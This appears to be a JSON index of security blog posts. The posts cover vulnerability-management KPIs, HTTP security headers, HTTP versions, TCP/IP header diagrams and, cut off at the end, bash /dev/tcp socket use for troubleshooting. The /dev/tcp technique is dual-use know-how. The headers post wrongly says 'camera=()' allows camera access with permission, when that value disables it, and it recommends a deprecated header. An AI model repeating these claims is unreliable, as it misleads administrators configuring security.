21:13","externalUrl":null,"permalink":"/tags/kpi/","section":"tags","summary":"","title":"kpi","type":"tags"},{"content":"","date":"2023-04-14 21:13","externalUrl":null,"permalink":"/tags/metrics/","section":"tags","summary":"","title":"metrics","type":"tags"},{"content":"","date":"2023-04-14 21:13","externalUrl":null,"permalink":"/tags/report/","section":"tags","summary":"","title":"report","type":"tags"},{"content":" In Vulnerability Management reporting, metrics and KPIs are both used to measure and track the security state, but they have different purposes and implications. Let\u0026rsquo;s start with metrics and KPIs (key performance indicators).\nMetrics vs KPI # Metrics and KPI are closely related concepts. It is commonly used in performance measurement and management, but they have distinct differences.\nMetric (definition)\nA metric is a quantifiable measurement that provides information about a specific aspect of a business or process. Can be used to track and assess performance but may not necessarily be directly tied to the strategic goals. Can be objective or subjective. For example, data points like revenue, website traffic, or customer satisfaction, which can be measured using quantitative or qualitative methods. KPI (Key Performance Indicator)\nA KPI is a specific type of metric that is directly linked to strategic goals and objectives. Used to evaluate the performance of a specific area of a business in achieving its strategic targets. Typically objective and well-defined. They are quantifiable and tied to specific, predetermined targets that are relevant to a strategic direction. Metrics can cover wide range of data points, and not all metrics are critical to success, such as some metrics may be useful for day-to-day operations but not necessarily indicative of overall performance.\nKPIs are carefully selected metrics that have a direct impact on strategic goals and they are crucial in measuring progress toward those goals.\nUsages/Examples # Metrics are:\nUsed for tracking and monitoring various aspects of a business. (but) not all metrics are equally important. DSome metrics may have more significance than others. For instance, the web traffic metric that measures the number of visitors to a website. While it provides valuable information about website performance, it may not be directly linked to the organization\u0026rsquo;s strategic goals.\nAnother example. The employee satisfaction score metric that assesses the satisfaction of employees within a company. It is important for HR management but may not be a KPI (unless employee satisfaction is a strategic goal).\nKPIs are:\nthe few key indicators that are essential for measuring success and ensuring alignment with strategic objectives. For instance, the Monthly Revenue Growth Rate is a KPI, and is directly used to measures the company financial performance. Its alignment with the strategic goal of increasing revenue by a certain percentage each month.\nAnother example is Customer Churn Rate KPI. It measures the percentage of customers who stop using a product or service, directly impacting the strategic goal of retaining customers and increasing customer lifetime value.\nVulnMgmt Report # In Vulnerability Management, both metrics and KPIs are used to track/measure the security state.\nA Vulnerability Management Report is aimed to achieve several objectives to ensure effective identification, assessment, and mitigation of security vulnerabilities within an organization\u0026rsquo;s systems and infrastructure. It also provides holistic view including root cause analysis (RCA), as well as recommended actions to address different purposes and implications.\nBy carefully selecting and tracking the right KPIs, organizations can improve their security state and achieve their strategic goals in term of vulnerability and risk management.\nVM Metrics # Metrics are used to provide the raw vulnerability data within a specific timeframe (such as weekly or monthly).\nVulnerability Scan # Below are the common metrics.\nThe number of scanned assets. The number of live assets. The number of live assets by OS. The number of new assets discovered. The number of assets removed. The number of successful authenticated scan assets. The number of vulnerability instances (unclosed). The number of new vulnerabilitites found. The number of vulnerabilities closed (remediated). The number of re-open vulnerabilities. Vulnerability Management # Below are the common metrics that categorized into 5 groups.\nTotal (accumulated):\nThe number of (unique) CVE by severity. The number of exploitable CVE. The number of CVE by different OS. The number of vulnerable products by vendor. The number of vulnerable assets. New:\nThe number of new (unique) CVE. The number of new exploitable CVE. The number of new CVE by different OS. The number of new vulnerable products by vendor. The number of new vulnerable assets. Top-10 (or top-X):\nThe top-10 CVE by occurence. The top-10 exploitable CVE. The top-10 CVE by different OS. The top-10 vulnerable products. The top-10 vulnerable vendors. The Most:\nThe top-10 assets with most vulnerabilities. The top-10 assets with most vulnerabilities by different OS. Exceptions:\nThe number of identified False Positive (FP) findings. The number of risk-accepted (RA) findings. The 5 categories can be repeated for different departments or business units or applications.\nVM KPI # KPIS are specific VM metrics to track progress towards strategic goals in Vulnerability Management. Usually it provides a rating against our strategic goals, such as the progress of remediation.\nMean Time To Remediate (MTTR) or Time to Remediate (TTR)\nMeasure the average or median time to address and remediate identified vulnerabilities. Shorter MTTR/TTR indicates higher efficiency in reduceing the likelihood of exploitation. Vulnerability Resolution Rate\nMeasure the percentage of vulnerabilities that have been remediated within spcific timeframe. Provides insight into the effectiveness of VM program where higher resolution rate indicates a proactive and successful approach. Risk Reduction\nMeasure the overall overall risk reduction in term of percentage. Align risk reduction as organization security objectives in enhancing overall security posture. Vulnerability Discovery Rate\nMeasure the rate at which new vulnerabilities are discovered over time. Re-open Vulnerability Rate\nIdentify the percentage of vulnerabilities that reoccur after being remediated, indicating potential weakness in remediation process. Authenticated Scan Rate\nMeasure the rating of successful authenticated scan which indicate the comprehensiveness and accuracy of the vulnerability assessment process. Compliance SLA\nMeasure against the security policy or regulatory requirements. False Positive (FP) Rate\nMeasure the percentage of reported vulnerabilities that, upon further investigation, are determined to be false positives. Risk-Accepted (RA) Rate\nMeasure the percentage of reported vulnerabilities that cannot be remediated due to whatever reason. Again, the KPI above can be repeated for different departments or business units or applications.\nFalse Sense of Security # Metric and KPI are both crucial measurements that provide valuable insights in term of VM operation and management. However, IMO, below are some of the useless or ineffective measurements that may lead to false sense of security.\nAverage CVSS Score\nMay over-simplify the analysis, as vulnerabilities affect system differently based on characteristics and functions. May create false-sense of security when low-severity vulnerabilities are numerous. Vulnerability Closure Rate\nA high closure rate does not necessary indicate the most critical vulnerabilities are being addressed. May lead to false sense of security and does not consider the risk associated with each vulnerability. May also lead to quantity over quality in remediation efforts. Total number of vulnerabilities.\nThe sheer quantity of vulnerabilities does not necessarily correlate with the severity or risk associated with those vulnerabilities and does not provide a clear understanding of a company risk posture.. May lead to inefficient resource allocation and inability to prioritize remediateion efforts effectively. Scan Coverage Rate\nMay not provide insights into the effectivesness of scan quality. Why This is Important? # How would you handle those vulnerabilities with no patch available? Have you ever seen a Vulnerability Management team simply groups them as False Positive?\nI have seen this, and I call it Security through obscurity.\nThe reason behind this is, they have mixed up between Vulnerability Management and Patch Management.\nAnd usually this is commonly found at those company where VM is managed by (untrained) Patch Management team. And it is also partly due to the KPI (setup by top management) to track those monthly vulnerability patching progress. Remember Goodhart\u0026rsquo;s Law?\nTo me, monthly patching progress is not a KPI (and shouldn\u0026rsquo;t be). It is just one of the metrics. This is the reason why it is important to understand the distinct between metric and KPI.\nSummary # In general,\nMetrics provide raw data in trending and measure the coverage and effectiveness in VM. KPI provides rating towards some strategic goals and measures the progress and efficiency in VM. Report provides holistic view of the entire exercise including effectiveness, efficiency, RCA and recommendations. Ineffective metrics and KPIs may lead to false sense of security. In summary, metrics are general measurements used to track various aspects of a business, while KPIs are a subset of critical metrics that are specifically chosen to evaluate an organization\u0026rsquo;s progress toward strategic goals. KPIs play a more focused and strategic role in performance management.\n","date":"2023-04-14 21:13","externalUrl":null,"permalink":"/posts/vulnerability_data_analytics/","section":"posts","summary":"Ineffective metrics and KPIs may lead to false sense of security in Vulnerability Management reporting.","title":"Vulnerability Data Analytics","type":"posts"},{"content":"Take the essential steps to secure your users via HTTP headers configuration at a website.\nSecuring website, is referring to configuration at the web server level. It is different than security a web application.\nAnd securing web application, is referring to secure programming practices to prevent the following attacks at the web application level:\nSQL-injection XSS SSRF XSRF XML external ntity attack insecure direct object references directory traversal Most of the time, it requires the developer to make the changes, at the web application or source code, for remediation.\nSecuring website, is usualy performed by system engineer, and should always be implemented as company policy. Its\u0026rsquo; purpose is to protect the users from the following attacks:\nEavedropping with HTTP connection. Cross-Site Scripting (XSS) Clickjacking MIME type sniffing attacks User privacy information disclosure via referrer header Mis-use of resources (camera or microphone) to access user privacy It is easy and straight forward to be configured, and can be easily detected by security scanner. Below is a list of HTTP headers configuration to secure your web servers.\nEssential HTTP Headers (server) # Here are the essential HTTP headers configuration for securing website. These includes my configuration tht you may follow.\nHTTP Header My configurtion Type Strict-Transport-Security max-age=31536000; includeSubDomains; preload essential Content-Security-Policy default-src 'self'; script-src 'self' ; img-src * essential X-Frame-Options SAMEORIGIN essential X-Content-Type-Options nosniff essential Referrer-Policy strict-origin-when-cross-origin essential Permissions-Policy accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=() essential X-XSS 1; mode=block optional HTTP Strict-Transport-Security (HSTS) # HTTP Strict Transport Security (HSTS) is a security feature that is implemented at the web server level and is designed to enhance the security of websites by forcing the use of HTTPS for all connections. HSTS works by instructing web browsers to only access a website over an encrypted HTTPS connection, even if the user types in the HTTP version of the website\u0026rsquo;s URL.\nWhen a website sets an HSTS header, it includes the max-age directive, which specifies the number of seconds that the browser should remember to access the website only over HTTPS. During this time, any attempts to access the website over HTTP will be automatically redirected to HTTPS. The HSTS header also includes the includeSubDomains directive, which tells the browser to apply the same HSTS policy to all subdomains of the website.\nThe recommended value for the max-age directive is 31536000 seconds (one year), as this provides a good balance between security and flexibility. However, the specific value may vary depending on the needs of the website.\nTo configure HSTS, the web server needs to include the HSTS header in the HTTP response to requests made to the website. For example, in Apache, the following code can be added to the website\u0026rsquo;s .htaccess file to set the HSTS header:\nHeader set Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains; preload\u0026#34; The preload parameter is optional but recommended as it allows the website to be included in the HSTS preload list maintained by web browsers, which can improve the security and performance of the website.\nAlthough a max-age of 1 year is acceptable for a domain, two years is the recommended value as explained on https://hstspreload.org\nContent Security Policy # Content Security Policy (CSP) is a security feature implemented at the web server level that helps protect websites against cross-site scripting (XSS) attacks and other types of content injection attacks. CSP allows website administrators to specify which sources of content are allowed to be loaded and executed on a page, which can help prevent malicious code from being injected into the page by an attacker.\nWhen a website sets a CSP header, it includes a set of directives that specify the sources of content that are allowed to be loaded on the page. These sources can include trusted servers, such as the website\u0026rsquo;s own server, as well as external content delivery networks (CDNs) and other trusted sources.\nThe recommended value and configuration of the CSP header can vary depending on the needs of the website. Generally, the CSP header should be set to a restrictive policy that only allows content from trusted sources to be loaded on the page. This can help prevent attackers from injecting malicious code into the page and can also help prevent data exfiltration attacks by preventing the loading of external resources.\nA basic CSP header might look like this:\nContent-Security-Policy: default-src \u0026#39;self\u0026#39;; This policy only allows content to be loaded from the same origin as the page itself, and will block any external content from being loaded. More complex CSP headers can include additional directives that allow specific types of content to be loaded from external sources, while still preventing malicious content from being injected into the page.\nThe specific configuration of the CSP header will depend on the needs of the website, and it is recommended that website administrators consult the CSP documentation and testing tools to ensure that their policy is configured correctly and is effective in preventing attacks.\nX-Frame-Options # The X-Frame-Options header (XFO) is a security feature implemented at the web server level that helps protect websites against clickjacking attacks. Clickjacking is a type of attack where an attacker tries to trick a user into clicking on a malicious link by hiding the link behind a legitimate-looking button or image.\nWhen a website sets an XFO header, it includes a directive that specifies whether or not the page can be displayed inside an HTML frame or iframe on another website. This can help prevent clickjacking attacks by ensuring that the website\u0026rsquo;s content is only displayed in the intended context.\nThe recommended value for the XFO header is to set it to SAMEORIGIN. This directive allows the page to be displayed inside a frame or iframe on another page, but only if the other page has the same origin as the original page. This means that the website\u0026rsquo;s content can still be embedded in pages on the same domain, but prevents it from being embedded in malicious websites that could be used for clickjacking attacks.\nTo configure the XFO header, the web server needs to include the header in the HTTP response to requests made to the website. For example, in Apache, the following code can be added to the website\u0026rsquo;s .htaccess file to set the X-Frame-Options header:\nHeader always append X-Frame-Options SAMEORIGIN This code will append the \u0026ldquo;SAMEORIGIN\u0026rdquo; directive to the XFO header for all HTTP responses from the website, ensuring that the website\u0026rsquo;s content can only be embedded in pages on the same domain.\nIt is recommended that website administrators configure the XFO header to help prevent clickjacking attacks and improve the security of their website.\nX-Content-Type-Options # The X-Content-Type-Options header is a security feature implemented at the web server level that helps protect websites against MIME type sniffing attacks. MIME type sniffing is a type of attack where an attacker tries to execute malicious code by tricking the browser into interpreting a file as a different type than it actually is.\nWhen a website sets an X-Content-Type-Options header, it includes a directive that specifies whether or not the browser should be allowed to sniff the MIME type of a file. This can help prevent MIME type sniffing attacks by ensuring that the browser only interprets files based on their actual MIME type.\nThe recommended value for the X-Content-Type-Options header is to set it to nosniff. This directive instructs the browser to not sniff the MIME type of a file, and to only interpret the file based on its actual MIME type. This helps prevent attackers from tricking the browser into interpreting a file as a different type than it actually is, which can be used to execute malicious code.\nFor example, in Apache, the following code can be added to the website\u0026rsquo;s .htaccess file to set the X-Content-Type-Options header:\nHeader set X-Content-Type-Options nosniff This code will set the nosniff directive for the X-Content-Type-Options header for all HTTP responses from the website, ensuring that the browser only interprets files based on their actual MIME type.\nIt is recommended that website administrators configure the X-Content-Type-Options header to help prevent MIME type sniffing attacks and improve the security of their website.\nReferrer-Policy # The Referrer-Policy header is a security feature implemented at the web server level that helps protect website user privacy by controlling the information passed in the HTTP Referrer header. The HTTP Referrer header is sent by the browser when a user clicks a link or submits a form, and it contains the URL of the page that the user came from.\nWhen a website sets a Referrer-Policy header, it includes a directive that specifies how much information should be passed in the Referrer header. This can help protect user privacy by limiting the amount of information that is passed to third-party websites.\nThe recommended value for the Referrer-Policy header is to set it to strict-origin-when-cross-origin. This directive instructs the browser to send the full URL in the Referrer header when navigating within the same origin, but only send the origin part of the URL when navigating to a different origin. This helps prevent third-party websites from accessing sensitive information about the user\u0026rsquo;s browsing history.\nTo configure the Referrer-Policy header, the web server needs to include the header in the HTTP response to requests made to the website. For example, in Apache, the following code can be added to the website\u0026rsquo;s .htaccess file to set the Referrer-Policy header:\nHeader always set Referrer-Policy \u0026#34;strict-origin-when-cross-origin\u0026#34; This code will set the strict-origin-when-cross-origin directive for the Referrer-Policy header for all HTTP responses from the website, ensuring that the Referrer header only contains the origin information when navigating to a different origin.\nIt is recommended that website administrators configure the Referrer-Policy header to help protect user privacy and improve the security of their website.\nPermissions-Policy # The Permissions-Policy header is a security feature implemented at the web server level that allows website administrators to control which features and APIs are available to a web page, based on the origin of the page. This can help prevent malicious web pages from accessing sensitive user information or executing unauthorized actions.\nWhen a website sets a Permissions-Policy header, it includes a directive that specifies which features and APIs are available to a web page. For example, the Permissions-Policy header can be used to control access to features such as camera, microphone, geolocation, and more.\nThe recommended value for the Permissions-Policy header is to set it to a restrictive value that only allows the features that are necessary for the website to function properly. This helps prevent malicious web pages from accessing sensitive user information or executing unauthorized actions.\nTo configure the Permissions-Policy header, the web server needs to include the header in the HTTP response to requests made to the website. For example, in Apache, the following code can be added to the website\u0026rsquo;s .htaccess file to set the Permissions-Policy header:\nHeader always set Permissions-Policy \u0026#34;camera=(), microphone=(), geolocation=()\u0026#34; This code will set the Permissions-Policy header to allow access to the camera, microphone, and geolocation APIs, but only if the website has explicit permission from the user.\nIt is recommended that website administrators configure the Permissions-Policy header to help prevent malicious web pages from accessing sensitive user information or executing unauthorized actions, and improve the security of their website.\nX-XSS # The X-XSS-Protection header is a security feature implemented at the web server level that helps protect websites against cross-site scripting (XSS) attacks. XSS attacks are a type of attack where an attacker injects malicious code into a web page, which is then executed by the victim\u0026rsquo;s browser.\nWhen a website sets an X-XSS-Protection header, it includes a directive that specifies whether or not the browser should enable its built-in XSS protection. The browser\u0026rsquo;s XSS protection can help prevent certain types of XSS attacks by blocking the execution of malicious scripts.\nThe recommended value for the X-XSS-Protection header is to set it to 1; mode=block. This directive instructs the browser to enable its built-in XSS protection and to block the execution of any detected malicious scripts.\nTo configure the X-XSS-Protection header, the web server needs to include the header in the HTTP response to requests made to the website. For example, in Apache, the following code can be added to the website\u0026rsquo;s .htaccess file to set the X-XSS-Protection header:\nHeader set X-XSS-Protection \u0026#34;1; mode=block\u0026#34; This code will set the 1; mode=block directive for the X-XSS-Protection header for all HTTP responses from the website, ensuring that the browser\u0026rsquo;s built-in XSS protection is enabled and that malicious scripts are blocked.\nIt is recommended that website administrators configure the X-XSS-Protection header to help protect their website against XSS attacks and improve the security of their website.\nTool at MySeq: httphdr_scan # I have created a cli tool, to perform quick scan on HTTP header. It is called httphdr_scan.\n$ ./main.py -h usage: main.py [-h] [-u \u0026lt;url\u0026gt; [\u0026lt;url\u0026gt; ...]] [-f \u0026lt;sites.url\u0026gt;] [-r] [-v] options: -h, --help show this help message and exit -u \u0026lt;url\u0026gt; [\u0026lt;url\u0026gt; ...] Specifying URL -f \u0026lt;sites.url\u0026gt; Specifying input site file -r Follow HTTP 301 redirection. -v verbose output Below is the sample output:\nSimilar Ideas # Online Security Headers Security Header Check - shcheck Links # moz://a Web Security Cheat Sheet HTTP headers ","date":"2023-04-04 17:26","externalUrl":null,"permalink":"/posts/insecurity_in_http_headers/","section":"posts","summary":"Based on essential security, here is how to protect users by securing HTTP headers for a website.","title":"Insecurity in HTTP Headers","type":"posts"},{"content":" I know 🍷/🍺 is not the answer, but it makes me forget the question. ","date":"2023-04-01 11:50","externalUrl":null,"permalink":"/posts/answer_likes_question/","section":"posts","summary":"🍷 🩵 🍺","title":"Answer 🩵 Question","type":"posts"},{"content":"How many HTTP versions have you come across before?\nHistory # HTTP/1.0 has been created since 1996~97 and we move to HTTP/1.1 (since 1999) and using it for most of the time. And then HTTP working group has introduced HTTP/2.0 (aka spdy) in 2015, and now HTTP/3 (aka QUIC) in 2022.\nAbout HTTP/1.x # HTTP/1.x released since 1996, and it is a stateless protocol. The release of HTTP/1.1 is to introduce the following features (lack in HTTP/1.0):\nKeep-alive mechanism which reuse the same TCP connection for multiple requests. Pipelining features which implies that user can send multiple requests before waiting for responses from servers. Parallel TCP connection with client to keep the browser performance at an acceptable level. Problems with HTTP/1.x:\nLack of prioritization which could lead to blocking of critical resources being download. Head-of-line blocking led to inefficient use of network resources, because it can handle only one request within the same pipeline at a time. This means HTTP/1.1 requires the responses to be sent in the order in which the requests were received. Large size in header which impacting performance especially on modern web (like mobile 4G connection). About HTTP/2 # HTTP/2 or SPDY, has some new features and it is mainly to address the problems found at HTTP/1.1. It includes:\nMultiplexing which effectively sending request and receiving response asynchronously. Header compression to compress request/response headers for reducing the amount of data transmitted. Server push which allow pushing of resources to client\u0026rsquo;s cache (before being requested) for better user experience. Stream prioritization allows critical resources to be fetched and rendered first, in clients\u0026rsquo; request. Binary framing is used to encapsulate message to make protocol more efficient. About HTTP/3 # HTTP/3 or QUIC - is a UDP-based stream-multiplexing, encrypted transport protocol that documented under RFC9000. This also means that firewall rule update is needed for HTTP/3 to work correctly because of new UDP transport protocol is introduced here. Thus it is aka Quick UDP Internet Connections (QUIC).\nQUIC has the benefits:\nBuilt-in encryption by incorporate TLS 1.3 by defaulti, and thus reduce the latency of establishing connection. Connection migration which allow mobile client to change IP address without lossing connectivity. 0-RTT or zero-round-trip-time is enabled for reducing latency of establishing connection. As of today, a few web sites have migrated to HTTP/3, for example, www.facebook.com, blog.cloudflare.com and www.google.com.\nManual checking on HTTP version # Majority of the browsers are supporting HTTP/2 (enabled by default) but not all are supporting HTTP/3 yet. Below are the curl and (projectdiscovery) httpX commands to check HTTP version.\n$ curl -sI https://www.google.com -o/dev/null -w \u0026#39;%{http_version}\\n\u0026#39; 2 $ curl -sI https://www.isc2.org -o/dev/null -w \u0026#39;%{http_version}\\n\u0026#39; 1.1 $ echo www.youtube.com | ./httpx -http2 -title -pipeline -vhost __ __ __ _ __ / /_ / /_/ /_____ | |/ / / __ \\/ __/ __/ __ \\| / / / / / /_/ /_/ /_/ / | /_/ /_/\\__/\\__/ .___/_/|_| /_/ projectdiscovery.io [INF] Current httpx version v1.3.0 (latest) Tools at MySeq: httpver_scan # I have created cli tool, to perform quick scan on HTTP version. It is called httpver_scan.\nBelow is the sample output where [301] redirection is not followed:\n[*] Scanning [7] sites... URLs Protocols Server Time / Total Content ================================================================================================================== [ 1] https://requestbin.com/ r_0 [307] HTTP/2 s:CloudFront [0.1506]/[0.1510] ~0.0kb [ 2] https://nghttp2.org/ r_0 [200] HTTP/2 s:nghttpx [0.3011]/[0.3014] ~6.2kb [ 3] http://www.isc2.org/ r_0 [301] HTTP/1.0 s: [0.0905]/[0.0908] ~0.0kb [ 4] https://www.isc2.org/ r_0 [200] HTTP/1.1 s: [1.9348]/[1.9355] ~114.7kb [ 5] https://facebook.com/ r_0 [301] HTTP/2 s: [0.3001]/[0.3006] ~0.0kb [ 6] https://www.facebook.com/ r_0 [200] HTTP/2 s: [0.5904]/[0.5906] ~61.2kb [ 7] https://httpbin.org/ \u0026lt; Timeout \u0026gt; [6.0867] [*] Completed 7/7 sites with 7 connections for 9.456673 sec. [ real: 6.10 sec]. Below is the sample output where [301] redirection is followed:\n[*] Scanning [7] sites... URLs Protocols Server Time / Total Content ================================================================================================================== [ 1] https://requestbin.com/ r_1 [200] HTTP/2 s: [1.3965]/[1.6643] ~522.1kb [ 2] https://nghttp2.org/ r_0 [200] HTTP/2 s:nghttpx [0.3163]/[0.3168] ~6.2kb [ 3] http://www.isc2.org/ r_1 [200] HTTP/1.1 s: [2.0711]/[2.1660] ~114.7kb [ 4] https://www.isc2.org/ r_0 [200] HTTP/1.1 s: [1.9245]/[1.9249] ~114.7kb [ 5] https://facebook.com/ r_1 [200] HTTP/2 s: [0.3767]/[0.6940] ~61.2kb [ 6] https://www.facebook.com/ r_0 [200] HTTP/2 s: [0.6108]/[0.6110] ~61.2kb [ 7] https://httpbin.org/ \u0026lt; Timeout \u0026gt; [6.0383] [*] Completed 7/7 sites with 10 connections for 13.415142 sec. [ real: 6.05 sec]. Links # HTTP/3 check - by LiteSpeed HTTP/2 - by Wikipedia HTTP/3 - by Wikipedia httpX - by Project Discovery http2 explained HTTP/2 Explained HTTP/3 Explained HTTP/1.1 Vs HTTP/2 Akamai demo HTTP Testing Tools ","date":"2023-03-21 16:34","externalUrl":null,"permalink":"/posts/http_version/","section":"posts","summary":"HTTP/1 vs HTTP/1.1 vs HTTP/2 vs HTTP/3","title":"HTTP Versioning","type":"posts"},{"content":" Protocol (Tools) # Protocol is a simple tool that:\nprovide standard network protocol headers, directly from command-line. can generate ASCII RFC-like header diagrams, including custom protocols. Installation # $ cd ~/repos $ git clone https://github.com/luismartingarcia/protocol.git $ cd protocol $ sudo python3 setup.py install $ $ protocol ip tcp udp icmp $ Protocol Headers # The Internet protocol suite, commonly known as TCP/IP, is a framework for organizing the set of communication protocols used in the Internet and similar computer networks according to functional criteria.\nThe foundational protocols in the suite are the Transmission Control Protocol (TCP), the User Datagram Protocol (UDP), and the Internet Protocol (IP).\nHere, I list the headers for IPv4, IPv6, TCP, UDP, ICMP, and ICMPv6 diagrams for reference.\nIPv4 Header # IPv4 Hdr 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |Version| IHL |Type of Service| Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Identification |Flags| Fragment Offset | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Time to Live | Protocol | Header Checksum | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Source Address | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Destination Address | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Options | Padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ IPv6 Header # IPv6 Hdr 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |Version| Traffic Class | Flow Label | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Payload Length | Next Header | Hop Limit | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | + + | | + Source Address + | | + + | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | + + | | + Destination Address + | | + + | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ TCP Header # TCP Hdr 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Source Port | Destination Port | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Sequence Number | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Acknowledgment Number | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Offset| Res. | Flags | Window | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Checksum | Urgent Pointer | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Options | Padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ UDP Header # UDP Hdr 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Source Port | Destination Port | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Length | Checksum | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ICMP Header # ICMP Hdr 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Type | Code | Checksum | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | + Message Body + | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ICMPv6 Header # ICMPv6 Hdr 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Type | Code | Checksum | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | + Message Body + | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Link # Protocol luismartingarcia/protocol ","date":"2023-03-14 16:33","externalUrl":null,"permalink":"/posts/tcpip_headers/","section":"posts","summary":"All the common protocol header diagrams in ASCII.","title":"TCP/IP Protocol Headers","type":"posts"},{"content":"","date":"2023-03-14 16:33","externalUrl":null,"permalink":"/tags/tcpip/","section":"tags","summary":"","title":"tcpip","type":"tags"},{"content":" Background # We can\u0026rsquo;t expect tools is always available when we troubleshoot a network issue, like checking if firewall ports are open. Tools like netcat, nmap, curl / wget, are always removed in an enterprise production environment.\nHere, we can use one of the built-in feature of bash, to open TCP/UDP sockets via /dev/tcp and /dev/udp device file, and perform read/write from the socket in bash.\nTCP/UDP Socket in bash # To open a TCP/UDP socket with a file descriptor:\nexec {file-descriptor}\u0026lt;\u0026gt;/dev/{protocol}/{host}/{port}\nfile-descriptor is a unique non-negative integer associated with each socket, where file descriptor 0, 1 and 2 are reserved for stdin, stdout and stderr, respectively.\n\u0026lt;\u0026gt; implies that the socket is open for read and write. \u0026lt; means read and \u0026gt; means write\nprotocol can be either tcp or udp.\nhost and port are for IP address (or hostname) and port number.\nFor example, to open a bi-directional TCP socket for www.google.com with HTTP port, with file descriptor 3:\n$ exec 3\u0026lt;\u0026gt;/dev/tcp/www.google.com/80 To close the socket, file-descriptor 3, use the 2 cmd below, the 1st for closing stdin, and 2nd for stdout:\n$ exec 3\u0026lt;\u0026amp;- $ exec 3\u0026gt;\u0026amp;- To read a message from a socket:\n$ read -r -u -n $MESSAGE \u0026lt;\u0026amp;3 $ MESSAGE=$(dd bs=$NUM_BYTES count=$COUNT \u0026lt;\u0026amp;3 2\u0026gt;/dev/null) To write a message to a socket:\n$ echo -ne $MESSAGE \u0026gt;\u0026amp;3 $ printf $MESSAGE \u0026gt;\u0026amp;3 Usages # To get SSH version. # #!/bin/bash exec 3\u0026lt;/dev/tcp/127.0.0.1/22 timeout 1 cat \u0026lt;\u0026amp;3 $ bash ssh_version.sh SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1 To get time from NIST.gov. # #!/bin/bash cat \u0026lt;/dev/tcp/time.nist.gov/13 $ bash nist_time.sh 60068 23-02-28 10:39:01 50 0 0 424.8 UTC(NIST) * To get HTTP server header. # #!/bin/bash exec 3\u0026lt;\u0026gt;/dev/tcp/www.google.com/80 echo -e \u0026#34;HEAD / HTTP/1.1\\r\\nhost: www.google.com\\r\\nConnection: 